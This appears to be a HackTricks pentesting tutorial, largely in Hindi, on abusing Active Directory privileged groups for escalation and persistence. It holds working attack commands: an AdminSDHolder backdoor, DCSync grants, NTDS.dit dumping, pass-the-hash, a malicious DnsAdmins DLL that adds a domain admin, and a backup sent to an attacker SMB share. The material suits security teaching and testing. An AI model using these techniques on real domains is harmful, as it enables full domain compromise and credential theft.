# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## प्रशासनिक विशेषाधिकारों वाले प्रसिद्ध समूह

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

इस समूह को ऐसे accounts और groups बनाने का अधिकार है जो domain में administrators नहीं हैं। इसके अतिरिक्त, यह Domain Controller (DC) पर local login की अनुमति देता है।

इस समूह के सदस्यों की पहचान करने के लिए, निम्नलिखित command चलाई जाती है:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

नए users जोड़ने की अनुमति है, साथ ही DC में local login की भी।<sup>[[1]](#references)</sup>

Account management से local administrator access तक जाने वाला एक conditional path है: **ऐसा ordinary group जिसे computer का LAPS password पढ़ने की अनुमति delegated हो**। उस exact group पर effective membership-write rights की जाँच करें, देखें कि वह protected है या नहीं, और पुष्टि करें कि कोई नया या controlled account वास्तव में उसमें शामिल हो सकता है। Target computer की LAPS read permission जाँचने से पहले account का token refresh करें। Encrypted Windows LAPS के लिए, directory read permission और password-decryption authority अलग-अलग आवश्यकताएँ हैं; केवल group membership या Account Operators membership से इनमें से कोई भी अधिकार सिद्ध नहीं होता। [Microsoft का Account Operators scope](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) और [Windows LAPS delegation](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory) देखें।

## AdminSDHolder group

**AdminSDHolder** group की Access Control List (ACL) महत्वपूर्ण है, क्योंकि यह Active Directory के सभी "protected groups" के लिए permissions निर्धारित करती है, जिनमें high-privilege groups भी शामिल हैं। यह mechanism अनधिकृत बदलावों को रोककर इन groups की सुरक्षा सुनिश्चित करता है।

कोई attacker **AdminSDHolder** group की ACL में बदलाव करके इसका दुरुपयोग कर सकता है और किसी standard user को full permissions दे सकता है। इससे उस user को सभी protected groups पर full control मिल जाएगा। यदि इस user की permissions बदली या हटाई जाती हैं, तो system के design के कारण वे एक घंटे के भीतर अपने आप फिर से लागू हो जाएँगी।<sup>[[14]](#references)</sup>

हाल के Windows Server documentation में भी कई built-in operator groups को **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` आदि) माना गया है। **SDProp** process, default रूप से हर 60 मिनट में **PDC Emulator** पर चलता है, `adminCount=1` सेट करता है, और protected objects पर inheritance को disable करता है। यह persistence के साथ-साथ उन पुराने privileged users को खोजने में भी उपयोगी है जिन्हें protected group से हटा दिया गया था, लेकिन जिनके पास अब भी non-inheriting ACL है।<sup>[[12]](#references)</sup>

Members की समीक्षा करने और permissions में बदलाव करने के commands में शामिल हैं:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

पुनर्स्थापन प्रक्रिया को तेज़ करने के लिए एक script उपलब्ध है: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

अधिक जानकारी के लिए [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) देखें।<sup>[[14]](#references)</sup>

## AD Recycle Bin

हटाए गए objects की visibility प्रभावी directory permissions से नियंत्रित होती है; केवल group का नाम यह साबित नहीं करता कि मौजूदा identity किसी object को सूचीबद्ध या पुनर्स्थापित कर सकती है। पूर्ण पुनर्स्थापन के लिए deletion से पहले AD Recycle Bin सक्षम होना चाहिए, और पुनर्स्थापन के लिए naming-context root पर Reanimate-Tombstones, rename rights और destination container पर CREATE_CHILD की भी आवश्यकता होती है। [Microsoft की Recycle Bin संबंधी guidance](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) और [undelete authorization rules](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) इन शर्तों के बीच अंतर स्पष्ट करते हैं। हटाए गए objects को पढ़ने की अनुमति वाली identity ऐसे records की जाँच कर सकती है जिनसे संवेदनशील जानकारी का पता चल सकता है:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

यह **पिछले privilege paths को पुनर्प्राप्त करने** के लिए उपयोगी है। Deleted objects में अब भी `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, पुराने SPNs या किसी deleted privileged group का DN मौजूद हो सकता है, जिसे बाद में कोई अन्य operator restore कर सकता है।

जब कोई object deleted state में रहता है, तो application-defined attributes में पुराना credential material भी मौजूद रह सकता है। इसे अलग से जाँचने योग्य lead मानें: current identity को deleted object enumerate करने **और** उस attribute को पढ़ने की अनुमति होनी चाहिए, value एक usable credential होनी चाहिए, और कोई still-active principal उसे स्वीकार करे। केवल group membership या deleted account name से इनमें से कोई भी चरण साबित नहीं होता; routine enumeration के दौरान credential values प्रिंट करने से बचें। [Microsoft का Recycle Bin documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) deletion के बाद attributes के संरक्षण का वर्णन करता है।

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Delegated ACLs के माध्यम से हटाए गए account को पुनर्स्थापित करना

किसी हटाए गए account के लिए ACL tool का `WRITE` परिणाम एक सुराग है, इस बात का प्रमाण नहीं कि undelete की सभी अनुमतियाँ प्रभावी हैं।<sup>[[18]](#references)</sup> हटाए गए object के ACL और `lastKnownParent` को सीधे जाँचें; BloodHound paths में deleted-object ACLs छूट सकते हैं।<sup>[[19]](#references)</sup> पुनर्स्थापित account अपना password hash बनाए रख सकता है, लेकिन उसे restore करने से password का पता नहीं चलता और न ही password-reset अधिकार मिलते हैं। Authentication के लिए अब भी एक मान्य credential आवश्यक है।<sup>[[19]](#references)</sup>

Linux से छिपे हुए हटाए गए accounts की enumeration करने और reanimation अधिकार की पुष्टि करने के लिए, recycled-object और deactivated-link LDAP controls के साथ `bloodyAD` का उपयोग करें। फिर चुने गए account को उसके `sAMAccountName` से restore करें। उदाहरण में दिए गए domain, host और identity को जाँचे जा रहे environment के अनुसार बदलें; write करने से पहले target DN और `lastKnownParent` की पुष्टि करें।<sup>[[19]](#references)</sup>

```bash
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get writable
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get object 'DC=example,DC=local' --attr nTSecurityDescriptor --resolve-sd | grep -i Reanimate-Tombstones
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=example,DC=local' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,objectSid
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' set restore target.user
```

### Domain Controller तक पहुंच

DC पर files तक पहुंच प्रतिबंधित है, जब तक user `Server Operators` group का सदस्य न हो। इसका सदस्य होने से access का स्तर बदल जाता है।

### Privilege Escalation

Sysinternals के `PsService` या `sc` का उपयोग करके service permissions का निरीक्षण और संशोधन किया जा सकता है। उदाहरण के लिए, `Server Operators` group को कुछ services पर full control प्राप्त है, जिससे arbitrary commands चलाना और privilege escalation करना संभव हो जाता है:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

यह command दिखाता है कि `Server Operators` के पास पूरा access है, जिससे वे elevated privileges पाने के लिए services में बदलाव कर सकते हैं।

## Backup Operators

`Backup Operators` की सदस्यता किसी host पर `SeBackupPrivilege` और `SeRestorePrivilege` दे सकती है; यह उसकी local policy और logon session पर निर्भर करता है। `whoami /groups` और `whoami /priv` से **commands चलाने वाली process के effective token** की जाँच करें: केवल सदस्यता से यह साबित नहीं होता कि `SeBackupPrivilege` मौजूद और enabled है। यदि privilege मौजूद है, लेकिन disabled है, तो उसे उस token में enable किया जा सकता है; यदि वह मौजूद नहीं है या हटा दिया गया है, तो backup operations उसका उपयोग नहीं कर सकते। `SeBackupPrivilege`, backup-aware APIs (उदाहरण के लिए, `FILE_FLAG_BACKUP_SEMANTICS` या `robocopy /B`) के ज़रिए सुरक्षित **reads** की सुविधा देता है; `SeRestorePrivilege` restore/write operations के लिए एक अलग privilege है। सामान्य directory listings और copies में backup semantics का उपयोग ज़रूरी नहीं है।<sup>[[1]](#references)</sup>

Group members की सूची देखने के लिए, यह execute करें:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### स्थानीय हमला

ऐसे host पर जहाँ effective token में `SeBackupPrivilege` है, नीचे दिया गया backup-aware copy किसी protected file को पढ़ सकता है:

1. ज़रूरी libraries import करें:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. यदि विशेषाधिकार मौजूद है लेकिन अक्षम है, तो उसे सक्षम करें और इस प्रक्रिया में उसकी स्थिति सत्यापित करें:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. किसी प्रतिबंधित डायरेक्टरी से फ़ाइल कॉपी करें, उदाहरण के लिए:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit` **domain controller (DC)** पर Active Directory database है। इस तरीके के लिए DC पर उपयुक्त token और database वाले volume तक access आवश्यक है; किसी अन्य जगह Backup Operators की membership से किसी खास DC तक access नहीं मिलता। आम तौर पर live database locked होता है, इसलिए उसे copy करने से पहले accessible shadow copy या किसी अन्य backup facility का उपयोग करें। Shadow copy बनाना या उसे उपलब्ध कराना भी host के VSS configuration और caller के अधिकारों पर निर्भर करता है। नीचे दिया गया उदाहरण मानता है कि DC पर `NTDS.dit` `C:` drive में `\Windows\NTDS` के अंतर्गत है; यदि ऐसा नहीं है, तो volume और path बदलें।

#### diskshadow.exe का उपयोग

1. अनुमति हो तो DC की `C:` drive की shadow copy बनाकर उसे `F:` के रूप में उपलब्ध कराएँ:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Shadow copy से `NTDS.dit` कॉपी करें:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

वैकल्पिक रूप से, फ़ाइल कॉपी करने के लिए `robocopy` का उपयोग करें:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. DC के `SYSTEM` hive को offline extraction के लिए सहेजें। `SAM` member systems पर local account database है; DC का `SAM` hive, `NTDS.dit` का विकल्प या domain Administrator hash का स्रोत नहीं है:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. `ntds.dit` और `SYSTEM.SAV` को विश्लेषण होस्ट पर ट्रांसफ़र करें और domain account hashes निकालें। किसी member system से सेव की गई `SAM` hive, उसकी matching `SYSTEM` hive के साथ, इसके बजाय local account hashes देती है:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. यदि `NTDS.dit` से **domain** Administrator का hash रिकवर किया गया है, तो domain authentication के लिए इसका परीक्षण किया जा सकता है। `SAM.SAV` से मिला local Administrator hash एक अलग credential है और इससे domain Administrator के रूप में authentication नहीं किया जा सकता।<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### wbadmin.exe का उपयोग

1. हमलावर मशीन पर SMB server के लिए NTFS filesystem सेट अप करें और target machine पर SMB credentials कैश करें।
2. system backup और `NTDS.dit` extraction के लिए `wbadmin.exe` का उपयोग करें:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

व्यावहारिक प्रदर्शन के लिए, [IPPSEC के साथ DEMO VIDEO](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) देखें।

## DnsAdmins

**DnsAdmins** समूह के सदस्य अपने विशेषाधिकारों का दुरुपयोग करके DNS सर्वर पर SYSTEM विशेषाधिकारों के साथ मनमानी DLL लोड कर सकते हैं। DNS सर्वर अक्सर Domain Controllers पर होस्ट किए जाते हैं। यह क्षमता शोषण की व्यापक संभावनाएँ प्रदान करती है।

DnsAdmins समूह के सदस्यों की सूची देखने के लिए, यह चलाएँ:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### मनमानी DLL निष्पादित करें (CVE‑2021‑40469)

> [!NOTE]
> यह vulnerability DNS service (आमतौर पर DCs के अंदर) में SYSTEM privileges के साथ arbitrary code के execution की अनुमति देती है। इस समस्या को 2021 में ठीक किया गया था।

Members `commands` जैसे इनका उपयोग करके DNS server से मनमानी DLL (स्थानीय रूप से या किसी remote share से) load करवा सकते हैं:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

DLL लोड करने के लिए DNS service को रीस्टार्ट करना आवश्यक है (इसके लिए अतिरिक्त permissions की आवश्यकता हो सकती है):

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

इस attack vector के बारे में अधिक जानकारी के लिए ired.team देखें।

#### Mimilib.dll

कमांड execution के लिए mimilib.dll का उपयोग करना भी संभव है। इसे खास commands या reverse shells execute करने के लिए संशोधित किया जा सकता है। अधिक जानकारी के लिए [यह पोस्ट देखें](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)।<sup>[[15]](#references)</sup>

### MitM के लिए WPAD Record

Global query block list को disable करने के बाद, DnsAdmins WPAD record बनाकर DNS records में बदलाव कर सकते हैं और Man-in-the-Middle (MitM) attacks कर सकते हैं। Network traffic को spoof और capture करने के लिए Responder या Inveigh जैसे tools का उपयोग किया जा सकता है।

### Event Log Readers
Members event logs तक पहुंच सकते हैं और उनमें plaintext passwords या command execution की जानकारी जैसी संवेदनशील जानकारी ढूंढ सकते हैं:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

यह समूह domain object पर DACLs को संशोधित कर सकता है, जिससे संभवतः DCSync privileges मिल सकते हैं। इस समूह का फायदा उठाकर privilege escalation करने की तकनीकें Exchange-AD-Privesc GitHub repo में विस्तार से दी गई हैं।

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

यदि आप इस समूह के सदस्य के रूप में कार्य कर सकते हैं, तो इसका पारंपरिक दुरुपयोग हमलावर के नियंत्रण वाले प्रिंसिपल को [DCSync](dcsync.md) के लिए आवश्यक replication अधिकार देना है:

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

ऐतिहासिक रूप से, **PrivExchange** ने mailbox access, coerced Exchange authentication और LDAP relay को जोड़कर इसी primitive तक पहुँच बनाई। भले ही relay का यह रास्ता mitigated हो, `Exchange Windows Permissions` की सीधी सदस्यता या किसी Exchange server पर नियंत्रण, domain replication rights पाने का एक उच्च-मूल्य वाला रास्ता बना रहता है।

## Hyper-V Administrators

Hyper-V Administrators के पास Hyper-V का पूरा access होता है, जिसका फायदा उठाकर virtualized Domain Controllers पर नियंत्रण पाया जा सकता है। इसमें live DCs को clone करना और NTDS.dit file से NTLM hashes निकालना शामिल है।

### Exploitation का उदाहरण

व्यावहारिक दुरुपयोग आम तौर पर host-level LPE की पुरानी तरकीबों के बजाय **DC disks/checkpoints तक offline access** के ज़रिए होता है। Hyper-V host का access मिलने पर, operator virtualized Domain Controller का checkpoint बना सकता है या उसे export कर सकता है, VHDX mount कर सकता है और guest के अंदर LSASS को छुए बिना `NTDS.dit`, `SYSTEM` और अन्य secrets निकाल सकता है:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

वहाँ से, `Windows\NTDS\ntds.dit` और registry hives को offline कॉपी करने के लिए `Backup Operators` workflow का फिर से उपयोग करें। संबंधित backup-file workflow:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

यह group सदस्यों को domain में Group Policies बनाने की अनुमति देता है। हालांकि, इसके सदस्य users या groups पर group policies लागू नहीं कर सकते और न ही मौजूदा GPOs edit कर सकते हैं।

महत्वपूर्ण बात यह है कि **बनाने वाला व्यक्ति नए GPO का owner बन जाता है** और आमतौर पर उसे बाद में edit करने के लिए पर्याप्त अधिकार मिल जाते हैं। इसका मतलब है कि यह group तब उपयोगी है जब आप इनमें से कोई काम कर सकते हों:

- एक malicious GPO बनाना और किसी admin को उसे target OU/domain से link करने के लिए राज़ी करना
- अपने बनाए हुए ऐसे GPO को edit करना जो पहले से किसी उपयोगी जगह से linked हो
- किसी अन्य delegated right का दुरुपयोग करना, जिससे आप GPOs link कर सकें, जबकि यह group आपको उन्हें edit करने की क्षमता देता है

व्यावहारिक दुरुपयोग में आमतौर पर SYSVOL-backed policy files के ज़रिए **Immediate Task**, **startup script**, **local admin membership**, या **user rights assignment** में बदलाव करना शामिल होता है।<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

यदि `SYSVOL` के ज़रिए GPO को मैन्युअल रूप से संपादित कर रहे हैं, तो याद रखें कि केवल बदलाव करना पर्याप्त नहीं है: `versionNumber`, `GPT.ini` और कभी-कभी `gPCMachineExtensionNames` को भी अपडेट करना होगा, वरना clients policy refresh को अनदेखा कर देंगे।<sup>[[9]](#references)</sup>

## Organization Management

जिन environments में **Microsoft Exchange** deploy किया गया है, वहाँ **Organization Management** नाम का एक विशेष group महत्वपूर्ण क्षमताएँ रखता है। इस group को **domain के सभी users के mailboxes तक पहुँचने** का privilege प्राप्त है और यह **'Microsoft Exchange Security Groups'** Organizational Unit (OU) पर **पूर्ण नियंत्रण** रखता है। इस नियंत्रण में **`Exchange Windows Permissions`** group भी शामिल है, जिसका privilege escalation के लिए दुरुपयोग किया जा सकता है।

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** group के सदस्यों को कई privileges प्राप्त होते हैं, जिनमें **`SeLoadDriverPrivilege`** भी शामिल है। यह उन्हें **Domain Controller पर locally log on करने**, उसे shutdown करने और printers manage करने की अनुमति देता है। इन privileges का दुरुपयोग करने के लिए, खासकर अगर **`SeLoadDriverPrivilege`** unelevated context में दिखाई न दे, तो User Account Control (UAC) को bypass करना आवश्यक है।<sup>[[1]](#references)</sup>

इस group के members की सूची पाने के लिए, यह PowerShell command इस्तेमाल की जाती है:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Domain Controllers पर यह समूह खतरनाक है, क्योंकि डिफ़ॉल्ट Domain Controller Policy `Print Operators` को **`SeLoadDriverPrivilege`** देती है। यदि आपको इस समूह के किसी सदस्य के लिए elevated token मिल जाता है, तो आप इस privilege को enable करके signed-but-vulnerable driver load कर सकते हैं और kernel/SYSTEM तक पहुँच सकते हैं।<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Token handling के विवरण के लिए, [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) देखें।

#### Remote Desktop Users

इस समूह के सदस्यों को Remote Desktop Protocol (RDP) के ज़रिए PCs तक access दिया जाता है। इन सदस्यों की enumeration के लिए PowerShell commands उपलब्ध हैं:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

RDP का exploitation करने के बारे में और जानकारी dedicated pentesting resources में मिल सकती है।

#### Remote Management Users

इसके सदस्य **Windows Remote Management (WinRM)** के ज़रिए PCs को access कर सकते हैं। इन सदस्यों की enumeration इस तरह की जाती है:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

WinRM से संबंधित exploitation techniques के लिए, विशिष्ट documentation देखनी चाहिए।

#### Server Operators

इस group को Domain Controllers पर विभिन्न configurations करने की permissions होती हैं, जिनमें backup और restore privileges, system time बदलना और system को shutdown करना शामिल है।<sup>[[1]](#references)</sup> सदस्यों की सूची देखने के लिए यह command दिया गया है:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Domain Controllers पर, `Server Operators` को आमतौर पर **services को reconfigure करने या start/stop करने** के लिए पर्याप्त अधिकार विरासत में मिलते हैं और default DC policy के ज़रिए `SeBackupPrivilege`/`SeRestorePrivilege` भी मिलते हैं। व्यवहार में, इससे वे **service-control abuse** और **NTDS extraction** के बीच सेतु बन जाते हैं:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

किसी service की सूची न बना पाना, किसी **ज्ञात service** तक पहुँच को खारिज नहीं करता। Service Control Manager, listing के लिए `SC_MANAGER_ENUMERATE_SERVICE` और `SC_MANAGER_CONNECT` को अलग-अलग जाँचता है; किसी नामित service को खोलने पर उसके अपने अधिकार जाँचे जाते हैं, जिनमें `SERVICE_CHANGE_CONFIG` और `SERVICE_START` शामिल हैं। सामान्य `sc.exe query` विफल होने पर भी effective token और उस service के ACL की समीक्षा करें। केवल configuration rights होना संभावित रास्ता है: उच्च-विशेषाधिकार वाले transition की संभावना service identity, start/stop rights और उपयोग योग्य trigger पर भी निर्भर करती है। [Microsoft का service access-rights संदर्भ](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) देखें।

अगर किसी service ACL में इस group को change/start rights मिले हैं, तो service को किसी मनमाने command पर सेट करें, उसे `LocalSystem` के रूप में start करें और फिर मूल `binPath` बहाल करें। अगर service control पर पाबंदी है, तो `NTDS.dit` कॉपी करने के लिए ऊपर बताई गई `Backup Operators` techniques अपनाएँ।

## References

- [1] [ired.team – Privileged Accounts और Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Privilege Escalation के लिए SeLoadDriverPrivilege का दुरुपयोग](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO Permissions का दुरुपयोग](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse, भाग 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPOs और OUs के लिए Red Teamer की मार्गदर्शिका](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – परिशिष्ट C: Active Directory में संरक्षित Accounts और Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Domain Admin Persistence पाने के लिए AdminSDHolder का दुरुपयोग और उसमें Backdoor डालना](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory में Escalation के लिए DnsAdmins Privilege का दुरुपयोग](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll edge के दुरुपयोग की जानकारी](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver function (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [18] [MS-ADTS - Undelete authorization rules](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)
- [19] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
